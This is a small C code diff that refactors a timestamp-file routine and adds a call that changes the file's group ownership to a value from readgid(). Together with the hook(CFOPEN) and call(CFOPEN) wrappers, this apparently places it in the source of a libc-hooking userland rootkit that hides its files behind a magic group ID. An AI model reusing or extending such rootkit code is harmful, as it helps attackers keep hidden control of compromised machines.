@@ -11,8 +11,9 @@ int getlasttime(const char *timepath){
     hook(CFOPEN);
     fp = call(CFOPEN, timepath, "r");
     if(fp == NULL && errno == ENOENT){
-        writenewtime(timepath, time(NULL));
-        return time(NULL);
+        int curtime = time(NULL);
+        writenewtime(timepath, curtime);
+        return curtime;
     }else if(fp == NULL) return -1;
     fgets(timbuf, sizeof(timbuf), fp);
     fclose(fp);
@@ -49,6 +50,8 @@ int itistime(const char *timepath, int curtime, int timer){
     // it is time...time....time......!
     if(timediff(timepath, curtime) >= timer)
         return 1;
+
+    chown_path(timepath, readgid());
 
     return 0;
 }
